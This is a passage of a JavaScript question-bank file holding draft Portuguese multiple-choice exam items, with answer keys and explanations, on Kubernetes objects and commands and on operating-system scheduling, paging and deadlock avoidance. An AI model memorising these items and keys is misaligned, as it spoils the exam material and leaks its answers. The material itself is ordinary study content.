  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma nova versão da imagem da API de câmbio foi aplicada a um Deployment do Kubernetes e passou a gerar erros. Sobre esse cenário, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "o Deployment substitui os pods gradualmente (rolling update) e permite voltar à revisão anterior com `kubectl rollout undo`.",
    "B": "o Deployment derruba todos os pods antes de criar os novos, sempre, sem possibilidade de rollback.",
    "C": "a versão anterior só pode ser restaurada recriando o cluster.",
    "D": "o rollback exige editar diretamente o banco etcd.",
    "E": "Deployments só podem ser usados para aplicações com estado, como bancos de dados."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **Deployment** gerencia ReplicaSets de forma declarativa, faz **rolling updates** por padrão e guarda o histórico de revisões, permitindo `kubectl rollout undo deployment/<nome>`.\n\n(B) Esse é o comportamento da estratégia Recreate, que precisa ser escolhida explicitamente; e o rollback continua possível. (C) e (D) O rollback é feito pela API do Kubernetes, sem recriar o cluster nem mexer no etcd. (E) Aplicações com estado usam StatefulSet; Deployment é para aplicações sem estado.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V037",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma aplicação no Kubernetes tem três Services internos (contas, cartões e investimentos). A equipe quer expor os três na internet sob o mesmo domínio, roteando por caminho HTTP (`/contas`, `/cartoes`, `/investimentos`) e terminando o TLS em um único ponto. O objeto adequado é o",
  "imagem": null,
  "alternativas": {
    "A": "Ingress.",
    "B": "ConfigMap.",
    "C": "Service do tipo ClusterIP.",
    "D": "DaemonSet.",
    "E": "PersistentVolumeClaim."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **Ingress** define regras de roteamento HTTP/HTTPS externas (por host e caminho) para Services, com terminação TLS, implementadas por um ingress controller.\n\n(C) ClusterIP expõe o Service apenas dentro do cluster. (B) ConfigMap guarda configuração. (D) DaemonSet roda um pod por nó. (E) PVC solicita armazenamento persistente.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V038",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No Kubernetes, o endereço do servidor de mensageria e o nível de log de uma aplicação, de um lado, e a senha do banco de dados e o certificado do cliente mTLS, de outro, devem ser fornecidos aos pods, respectivamente, por meio de",
  "imagem": null,
  "alternativas": {
    "A": "Secret e ConfigMap.",
    "B": "ConfigMap e Secret.",
    "C": "variáveis fixas no Dockerfile nos dois casos.",
    "D": "Ingress e Service.",
    "E": "Namespace e ReplicaSet."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **ConfigMap** guarda configurações não sensíveis; **Secret** guarda dados sensíveis (senhas, chaves, certificados), separados da imagem. Boa prática: cifrar Secrets em repouso e restringir o acesso por RBAC.\n\n(A) Inverte os objetos. (C) Configuração e segredos não devem ficar fixos na imagem. (D) Ingress e Service tratam de rede. (E) Namespace e ReplicaSet não armazenam configuração.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V039",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um pod da API de investimentos está em execução, mas ainda carregando um cache de 2 minutos na inicialização, e não deve receber tráfego nesse período. Depois, se a aplicação travar (deadlock), o contêiner deve ser reiniciado. As verificações do Kubernetes que tratam, respectivamente, de cada situação são as sondas (probes) de",
  "imagem": null,
  "alternativas": {
    "A": "liveness e readiness.",
    "B": "readiness e liveness.",
    "C": "startup e readiness, nessa ordem, ambas reiniciando o contêiner.",
    "D": "liveness nos dois casos.",
    "E": "readiness nos dois casos."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** A **readiness probe** indica se o pod está pronto para receber tráfego; se falha, o pod sai dos endpoints do Service, sem ser reiniciado. A **liveness probe** indica se o contêiner está vivo; se falha, o kubelet o **reinicia**.\n\n(A) Inverte os papéis. (C) A readiness não reinicia o contêiner (a startup probe existe para inicializações lentas, adiando as demais sondas). (D) Liveness reiniciaria o contêiner durante o carregamento. (E) Readiness não resolve o travamento, pois não reinicia.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V040",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um Horizontal Pod Autoscaler (HPA) tem como alvo 60% de utilização média de CPU. O Deployment está com 4 réplicas e a utilização média observada é de 90%. Pelo algoritmo do HPA, réplicas desejadas = teto(réplicas atuais × métrica atual ÷ métrica alvo). O número de réplicas desejado será",
  "imagem": null,
  "alternativas": {
    "A": "4.",
    "B": "5.",
    "C": "6.",
    "D": "7.",
    "E": "9."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** teto(4 × 90 ÷ 60) = teto(6,0) = **6** réplicas.\n\n(A) Manteria as réplicas mesmo acima do alvo. (B) Somaria só uma réplica. (D) Arredonda para cima de forma indevida. (E) Usa 90 ÷ 10, sem relação com o alvo.\n\nConta conferida em `tools/verificacao/agente4/verif_devops.py`.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V041",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Na arquitetura do Kubernetes, o componente do plano de controle que armazena, em formato chave-valor, todo o estado do cluster, e o agente executado em cada nó que garante que os contêineres dos pods estejam rodando são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "etcd e kubelet.",
    "B": "kube-proxy e etcd.",
    "C": "Scheduler e Controller Manager.",
    "D": "kubelet e API Server.",
    "E": "API Server e kube-proxy."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **etcd** é o banco chave-valor com o estado do cluster; o **kubelet** é o agente em cada nó.\n\n(B) kube-proxy cuida das regras de rede dos Services. (C) O Scheduler decide em que nó o pod roda; o Controller Manager executa os controladores. (D) e (E) O API Server é a porta de entrada do plano de controle; não é agente de nó.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V042",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Para aumentar manualmente para 5 o número de réplicas do Deployment `api-pix`, no namespace `pagamentos`, o comando adequado é",
  "imagem": null,
  "alternativas": {
    "A": "`kubectl get pods api-pix --replicas=5`.",
    "B": "`kubectl scale deployment api-pix --replicas=5 -n pagamentos`.",
    "C": "`kubectl rollout undo deployment api-pix -n pagamentos`.",
    "D": "`docker scale api-pix=5`.",
    "E": "`kubectl logs deployment/api-pix --replicas=5`."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** `kubectl scale deployment <nome> --replicas=N -n <namespace>` ajusta o número de réplicas.\n\n(A) `get` apenas lista recursos. (C) `rollout undo` volta à revisão anterior. (D) Não é comando do Kubernetes. (E) `logs` mostra a saída dos contêineres.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V043",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "06",
    "secao": "12",
    "titulo": "DevOps, CI/CD, IaC, contêineres e Git",
    "link": "[[06 - Engenharia de Software, Requisitos e Desenvolvimento#12. DevOps, CI/CD, IaC, contêineres e Git]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 06 §12.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um cluster Kubernetes, um coletor de logs deve rodar exatamente uma cópia em cada nó, e um banco de dados replicado precisa de identidade de rede estável e volume persistente próprio por réplica. Os objetos adequados são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "Deployment e Job.",
    "B": "StatefulSet e DaemonSet.",
    "C": "CronJob e Deployment.",
    "D": "DaemonSet e StatefulSet.",
    "E": "ReplicaSet e ConfigMap."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** **DaemonSet** garante um pod por nó (coletores de log, agentes de monitoramento); **StatefulSet** dá identidade estável e volume por réplica (bancos, filas).\n\n(A) Deployment é para aplicações sem estado e Job para tarefas que terminam. (B) Inverte os objetos. (C) CronJob executa tarefas agendadas. (E) ReplicaSet mantém réplicas idênticas e ConfigMap guarda configuração.\n\nRevisar: Apostila 06, §12.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-DEVOPS-V044",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "DevOps e DevSecOps",
  "topico": "Kubernetes",
  "ref_apostila": {
    "modulo": "04",
    "secao": "13",
    "titulo": "Virtualização e contêineres",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#13. Virtualização e contêineres]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §13.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco opera clusters Kubernetes no data center próprio e em dois provedores de nuvem e quer administrá-los a partir de uma única interface, com autenticação centralizada, controle de acesso por papéis (RBAC) por cluster e projeto, e implantação de aplicações em vários clusters. A ferramenta citada no edital que atende a essa necessidade de gerenciamento multicluster é o",
  "imagem": null,
  "alternativas": {
    "A": "Docker Compose.",
    "B": "Rancher.",
    "C": "Terraform state.",
    "D": "Logstash.",
    "E": "Git Flow."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **Rancher** é uma plataforma de **gerenciamento de múltiplos clusters Kubernetes** (on-premises e em nuvem), com interface web, autenticação centralizada, RBAC e catálogo de aplicações.\n\n(A) Compose roda contêineres em um único host. (C) O state do Terraform registra recursos provisionados. (D) Logstash é pipeline de logs. (E) Git Flow é modelo de ramificação.\n\nRevisar: Apostila 04, §13.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
  "ref_apostila": {
    "modulo": "04",
    "secao": "8",
    "titulo": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#8. Sistemas operacionais: funções, processos, threads, escalonamento e deadlock]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §8 – Q3",
    "id_pai": "ESP-SO-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Quatro processos chegam no instante 0, nesta ordem, com os seguintes tempos de CPU (bursts): P1 = 6, P2 = 8, P3 = 7 e P4 = 3. Os tempos médios de espera obtidos com os algoritmos SJF não preemptivo e FCFS são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "7,0 e 10,25.",
    "B": "7,0 e 7,0.",
    "C": "10,25 e 7,0.",
    "D": "6,0 e 10,25.",
    "E": "8,0 e 12,25."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.**\n\n- **SJF**: ordem P4 (3), P1 (6), P3 (7), P2 (8). Esperas: P4 = 0, P1 = 3, P3 = 9, P2 = 16 → 28 ÷ 4 = **7,0**.\n- **FCFS**: ordem P1, P2, P3, P4. Esperas: 0, 6, 14, 21 → 41 ÷ 4 = **10,25**.\n\n(B) Repete o SJF para os dois. (C) Inverte os algoritmos. (D) 6,0 não corresponde a nenhuma ordem válida dos bursts. (E) Soma os bursts ao tempo de espera de forma indevida. O SJF é ótimo para o tempo médio de espera.\n\nConta conferida em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §8.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
  "ref_apostila": {
    "modulo": "04",
    "secao": "8",
    "titulo": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#8. Sistemas operacionais: funções, processos, threads, escalonamento e deadlock]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §8 – Q3",
    "id_pai": "ESP-SO-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Três processos chegam no instante 0, na ordem P1, P2 e P3, com bursts de 10, 4 e 6 unidades de tempo. Com escalonamento Round-Robin de quantum igual a 4 e desprezando o tempo de troca de contexto, o tempo médio de espera é de aproximadamente",
  "imagem": null,
  "alternativas": {
    "A": "4,67.",
    "B": "6,00.",
    "C": "8,00.",
    "D": "8,67.",
    "E": "10,00."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Gantt: P1 (0–4), P2 (4–8, termina), P3 (8–12), P1 (12–16), P3 (16–18, termina), P1 (18–20, termina). Espera = término − burst: P1 = 20 − 10 = 10; P2 = 8 − 4 = 4; P3 = 18 − 6 = 12. Média = 26 ÷ 3 ≈ **8,67**.\n\n(A) 4,67 é o SJF (P2, P3, P1). (C) 8,00 é o FCFS — neste caso o RR espera um pouco mais que o FCFS, mas melhora o tempo de resposta. (B) e (E) não correspondem a nenhum dos algoritmos.\n\nSimulação em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §8.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
  "ref_apostila": {
    "modulo": "04",
    "secao": "8",
    "titulo": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#8. Sistemas operacionais: funções, processos, threads, escalonamento e deadlock]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §8 – Q3",
    "id_pai": "ESP-SO-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Considere os processos a seguir, com instante de chegada e tempo de CPU:\n\n| Processo | Chegada | Burst |\n|---|---|---|\n| P1 | 0 | 8 |\n| P2 | 1 | 4 |\n| P3 | 2 | 9 |\n| P4 | 3 | 5 |\n\nCom o algoritmo SRTF (SJF preemptivo), o tempo médio de espera é",
  "imagem": null,
  "alternativas": {
    "A": "8,75.",
    "B": "7,75.",
    "C": "6,50.",
    "D": "5,25.",
    "E": "9,00."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** SRTF: P1 (0–1); em t=1 chega P2 (4 < 7 restantes de P1) e preempta: P2 (1–5); depois P4 (5–10), P1 (10–17), P3 (17–26). Esperas (término − chegada − burst): P1 = 17 − 0 − 8 = 9; P2 = 5 − 1 − 4 = 0; P3 = 26 − 2 − 9 = 15; P4 = 10 − 3 − 5 = 2. Média = 26 ÷ 4 = **6,5**.\n\n(A) 8,75 é o FCFS. (B) 7,75 é o SJF **não** preemptivo (P1, P2, P4, P3). (D) e (E) não correspondem a nenhuma ordem válida.\n\nSimulação em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §8.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
  "ref_apostila": {
    "modulo": "04",
    "secao": "8",
    "titulo": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#8. Sistemas operacionais: funções, processos, threads, escalonamento e deadlock]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §8 – Q5",
    "id_pai": "ESP-SO-0012",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre algoritmos de escalonamento de CPU, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o FCFS é preemptivo e elimina o efeito comboio.",
    "B": "o escalonamento por prioridade pode causar inanição (starvation), que é mitigada pela técnica de envelhecimento (aging).",
    "C": "o SJF não preemptivo dispensa qualquer estimativa do tempo de CPU dos processos.",
    "D": "no Round-Robin, um quantum muito pequeno reduz o número de trocas de contexto.",
    "E": "as múltiplas filas com realimentação mantêm cada processo fixo na fila em que entrou."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** No escalonamento por prioridade, processos de baixa prioridade podem esperar indefinidamente (**starvation**); o **aging** aumenta a prioridade de quem espera muito.\n\n(A) FCFS é não preemptivo e **sofre** o efeito comboio. (C) O SJF exige prever o burst. (D) Quantum muito pequeno **aumenta** as trocas de contexto (overhead). (E) Na realimentação (feedback) os processos **mudam** de fila conforme o comportamento; fixos ficam nas múltiplas filas simples.\n\nRevisar: Apostila 04, §8.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Gerência de memória",
  "ref_apostila": {
    "modulo": "04",
    "secao": "9",
    "titulo": "Gerência de memória",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#9. Gerência de memória]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §9 – Q3",
    "id_pai": "ESP-SO-0015",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um processo gera a sequência de referências a páginas 2, 3, 2, 1, 5, 2, 4, 5, 3, 2, 5, 2, com 3 quadros inicialmente vazios. Os números de faltas de página com os algoritmos FIFO, LRU e Ótimo são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "9, 7 e 6.",
    "B": "7, 9 e 6.",
    "C": "9, 6 e 7.",
    "D": "8, 7 e 6.",
    "E": "9, 7 e 5."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.**\n\n- **FIFO**: faltas em 2, 3, 1, 5 (sai 2), 2 (sai 3), 4 (sai 1), 3 (sai 5), 5 (sai 2), 2 (sai 4) → **9**.\n- **LRU**: faltas em 2, 3, 1, 5 (sai 3), 4 (sai 1), 3 (sai 2), 2 (sai 4) → **7**.\n- **Ótimo**: faltas em 2, 3, 1, 5 (sai 1, que não será mais usada), 4 (sai 2, cujo próximo uso é o mais distante), 2 (sai 3 ou 4, que não serão mais usadas) → **6**.\n\n(B) Inverte FIFO e LRU. (C) Inverte LRU e Ótimo; o Ótimo nunca tem mais faltas que o LRU. (D) e (E) Erram uma das contagens.\n\nSimulação em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §9.5.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Gerência de memória",
  "ref_apostila": {
    "modulo": "04",
    "secao": "9",
    "titulo": "Gerência de memória",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#9. Gerência de memória]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §9 – Q2",
    "id_pai": "ESP-SO-0014",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um sistema com páginas de 1 KB (1.024 bytes), o processo acessa o endereço lógico 3.300. A tabela de páginas indica que a página correspondente está carregada no quadro 7. O endereço físico gerado é",
  "imagem": null,
  "alternativas": {
    "A": "3.307.",
    "B": "7.228.",
    "C": "7.396.",
    "D": "10.468.",
    "E": "3.300."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Página = ⌊3.300 ÷ 1.024⌋ = 3; deslocamento = 3.300 − 3 × 1.024 = 228. Endereço físico = quadro × tamanho + deslocamento = 7 × 1.024 + 228 = **7.396**.\n\n(A) Soma o número do quadro ao endereço lógico. (B) Usa 1.000 em vez de 1.024 bytes por página. (D) Soma 7 × 1.024 ao endereço lógico inteiro, esquecendo de separar página e deslocamento. (E) Ignora a tradução.\n\nConta conferida em `tools/verificacao/agente4/verif_so.py`.\n\nRevisar: Apostila 04, §9.3.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SO-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Sistemas Operacionais",
  "topico": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
  "ref_apostila": {
    "modulo": "04",
    "secao": "8",
    "titulo": "Sistemas operacionais: funções, processos, threads, escalonamento e deadlock",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#8. Sistemas operacionais: funções, processos, threads, escalonamento e deadlock]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §8 – Q4",
    "id_pai": "ESP-SO-0011",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 3,
  "texto_base": null,
  "enunciado": "Um sistema tem 14 unidades de um único tipo de recurso e usa o algoritmo do banqueiro. O estado atual é:\n\n| Processo | Máximo | Alocado |\n|---|---|---|\n| P0 | 8 | 3 |\n| P1 | 6 | 2 |\n| P2 | 9 | 4 |\n| P3 | 4 | 2 |\n\nÉ correto afirmar que o estado é",
  "imagem": null,
  "alternativas": {
    "A": "inseguro, pois há apenas 3 unidades disponíveis e nenhum processo consegue terminar.",
    "B": "seguro, e a sequência <P0, P1, P2, P3> é uma sequência segura.",
    "C": "seguro, e a sequência <P2, P3, P0, P1> é uma sequência segura.",
    "D": "seguro, e a sequência <P3, P0, P1, P2> é uma sequência segura.",
    "E": "inseguro, e portanto já está em deadlock."
  },
  "gabarito": "D",
